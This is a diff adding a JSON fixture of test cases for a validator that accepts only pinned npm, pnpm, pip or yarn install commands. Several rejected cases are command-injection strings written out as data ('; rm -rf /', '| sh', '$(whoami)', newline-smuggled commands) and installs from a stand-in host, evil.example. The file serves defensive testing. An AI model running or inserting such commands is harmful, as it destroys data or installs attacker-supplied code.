@@ -1,0 +1,448 @@
+{
+  "cases": [
+    {
+      "name": "npm scoped pin",
+      "command": "npm install -g @scope/pkg@1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "npm short subcommand",
+      "command": "npm i foo@1.0.0",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "npm add with prerelease and build",
+      "command": "npm add foo@1.0.0-beta.1+build.5",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "pnpm two packages",
+      "command": "pnpm add -g foo@1.2.3 bar@2.0.0",
+      "ok": true,
+      "installer": "pnpm"
+    },
+    {
+      "name": "pnpm install",
+      "command": "pnpm install foo@1.2.3",
+      "ok": true,
+      "installer": "pnpm"
+    },
+    {
+      "name": "sha256 digest pin",
+      "command": "npm install foo@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "uppercase digest pin",
+      "command": "npm install foo@sha256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "v-prefixed version",
+      "command": "npm install --ignore-scripts -g foo@v1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "surrounding whitespace",
+      "command": "  npm install foo@1.2.3  ",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "all allowed flags",
+      "command": "npm install foo@1.2.3 --force --quiet -q --global --ignore-scripts",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "uppercase package name",
+      "command": "npm install Foo@1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "uppercase scope",
+      "command": "npm install @Scope/Pkg@1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "no-break space separates words",
+      "command": "npm\u00a0install foo@1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "form feed separates words",
+      "command": "npm install\ffoo@1.2.3",
+      "ok": true,
+      "installer": "npm"
+    },
+    {
+      "name": "pip pinned (api only)",
+      "command": "pip install requests==2.31.0",
+      "ok": true,
+      "installer": "pip"
+    },
+    {
+      "name": "yarn global add (api only)",
+      "command": "yarn global add foo@1.2.3",
+      "ok": true,
+      "installer": "yarn"
+    },
+    {
+      "name": "empty",
+      "command": "",
+      "ok": false,
+      "reasonContains": "no install command"
+    },
+    {
+      "name": "blank",
+      "command": "   ",
+      "ok": false,
+      "reasonContains": "no install command"
+    },
+    {
+      "name": "semicolon",
+      "command": "npm install foo@1.2.3; rm -rf /",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "and-and",
+      "command": "npm install foo@1.2.3 && curl x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "pipe",
+      "command": "npm install foo@1.2.3 | sh",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "command substitution",
+      "command": "npm install $(whoami)",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "backtick",
+      "command": "npm install `whoami`",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "redirect",
+      "command": "npm install foo@1.2.3 > out",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "quotes",
+      "command": "npm install 'foo@1.2.3'",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "double quotes",
+      "command": "npm install \"foo@1.2.3\"",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "glob",
+      "command": "npm install foo@*",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "tilde",
+      "command": "npm install ~/x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "hash",
+      "command": "npm install foo@1.2.3 #x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "bang",
+      "command": "npm install foo@1.2.3 !x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "caret range",
+      "command": "npm install foo@^1.2.3",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "gte range",
+      "command": "npm install foo@>=1.0.0",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "tab",
+      "command": "npm install foo@1.2.3\tbar@2.0.0",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "newline",
+      "command": "npm install foo@1.2.3\nrm x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "carriage return",
+      "command": "npm install foo@1.2.3\rrm x",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "backslash",
+      "command": "npm install foo\\@1.2.3",
+      "ok": false,
+      "reasonContains": "shell syntax"
+    },
+    {
+      "name": "unknown installer",
+      "command": "curl http://x",
+      "ok": false,
+      "reasonContains": "unsupported installer"
+    },
+    {
+      "name": "installer is case sensitive",
+      "command": "NPM install foo@1.2.3",
+      "ok": false,
+      "reasonContains": "unsupported installer"
+    },
+    {
+      "name": "prototype key as installer",
+      "command": "constructor install foo@1.2.3",
+      "ok": false,
+      "reasonContains": "unsupported installer"
+    },
+    {
+      "name": "proto key as installer",
+      "command": "__proto__ install foo@1.2.3",
+      "ok": false,
+      "reasonContains": "unsupported installer"
+    },
+    {
+      "name": "npm run",
+      "command": "npm run build",
+      "ok": false,
+      "reasonContains": "is not an install command"
+    },
+    {
+      "name": "npm alone",
+      "command": "npm",
+      "ok": false,
+      "reasonContains": "is not an install command"
+    },
+    {
+      "name": "npm uninstall",
+      "command": "npm uninstall foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not an install command"
+    },
+    {
+      "name": "pnpm run",
+      "command": "pnpm dlx foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not an install command"
+    },
+    {
+      "name": "no version",
+      "command": "npm install foo",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "latest tag",
+      "command": "npm install foo@latest",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "two part version",
+      "command": "npm install foo@1.2",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "trailing garbage on version",
+      "command": "npm install foo@1.2.3x",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "double at",
+      "command": "npm install foo@1.2.3@latest",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "wildcard x",
+      "command": "npm install foo@1.x",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "empty version",
+      "command": "npm install foo@",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "dangling prerelease dash",
+      "command": "npm install foo@1.2.3-",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "scoped without version",
+      "command": "npm install @scope/pkg",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "github shorthand",
+      "command": "npm install github:user/repo",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "bad digest",
+      "command": "npm install foo@sha256:xyz",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "short digest",
+      "command": "npm install foo@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "non-ascii letter folds to s",
+      "command": "npm install \u017fcope@1.2.3",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "one unpinned among pinned",
+      "command": "npm install foo@1.2.3 bar",
+      "ok": false,
+      "reasonContains": "pin an exact version"
+    },
+    {
+      "name": "registry flag",
+      "command": "npm install --registry http://evil.example foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not allowed"
+    },
+    {
+      "name": "registry flag with equals",
+      "command": "npm install --registry=https://evil.example foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not allowed"
+    },
+    {
+      "name": "dev flag",
+      "command": "npm install -D foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not allowed"
+    },
+    {
+      "name": "prefix flag",
+      "command": "npm install --prefix=/tmp foo@1.2.3",
+      "ok": false,
+      "reasonContains": "is not allowed"
+    },
+    {
+      "name": "ignore-scripts with value",
+      "command": "npm install foo@1.2.3 --ignore-scripts=false",
+      "ok": false,
+      "reasonContains": "is not allowed"
+    },
+    {
+      "name": "no package",
+      "command": "npm install",
+      "ok": false,
+      "reasonContains": "names no package"
+    },
+    {
+      "name": "flags only",
+      "command": "npm install -g",
+      "ok": false,
+      "reasonContains": "names no package"
+    },
+    {
+      "name": "https url",
+      "command": "npm install https://evil.example/x.tgz",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "git plus https",
+      "command": "npm install git+https://github.com/a/b",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "upper case git plus",
+      "command": "npm install GIT+ssh://host/a/b",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "version that is a url",
+      "command": "npm install foo@git+https://x/y",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "relative path",
+      "command": "npm install ./local",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "parent path",
+      "command": "npm install ../x",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "absolute path",
+      "command": "npm install /abs/path",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "file scheme",
+      "command": "npm install file:x",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    },
+    {
+      "name": "upper case file scheme",
+      "command": "npm install FILE:x",
+      "ok": false,
+      "reasonContains": "not a registry package"
+    }
+  ]
+}
